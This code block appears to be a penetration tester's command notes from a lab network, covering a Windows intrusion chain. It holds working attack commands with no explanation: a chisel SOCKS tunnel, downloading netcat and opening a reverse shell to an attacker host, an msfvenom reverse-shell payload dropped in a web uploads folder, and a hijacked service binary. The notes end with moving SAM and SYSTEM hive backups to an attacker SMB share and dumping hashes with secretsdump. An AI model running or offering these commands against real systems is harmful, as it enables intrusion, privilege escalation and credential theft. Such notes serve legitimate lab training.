```
Invoke-Portscan -Hosts 10.200.80.100 -TopPorts 50

netsh advfirewall firewall add rule name="Chisel-Alvin" dir=in action=allow protocol=tcp localport=35673
./chisel176alvin.exe server -p 35673 --socks5
./chisel_1.7.6_linux_amd64 client 10.200.80.150:35673 12345:socks

curl.exe http://10.50.81.6/nc.exe -o c:\\windows\\temp\\nc-alvin.exe
upload /usr/share/windows-resources/binaries/nc.exe c:\windows\temp\nc.exe

dir c:\windows\temp\nc.exe

/usr/share/powershell-empire/data/module_source/situational_awareness

powershell.exe c:\\windows\\temp\\nc-alvin.exe 10.50.81.6 4242 -e cmd.exe

msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.50.81.6 LPORT=4444
curl http://10.50.81.6/shell.exe -o c:\\xampp\\htdocs\\resources\\uploads\\shell-alvin.exe
C:\xampp\htdocs\resources\uploads
powershell.exe c:\\xampp\\htdocs\\resources\\uploads\\shell-alvin.exe
https://www.jaacostan.com/2020/09/printspoofer-windows-privilege.html


net use \\10.50.81.6\share /USER:user s3cureP@ssword
copy \\10.50.81.6\share\Wrapper.exe %TEMP%\wrapper-alvin.exe

copy %TEMP%\wrapper-alvin.exe "C:\Program Files (x86)\System Explorer\System.exe"

move sam.bak \\10.50.81.6\share\sam.bak
move system.bak \\10.50.81.6\share\system.bak
net use \\10.50.81.6\share /del

python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```
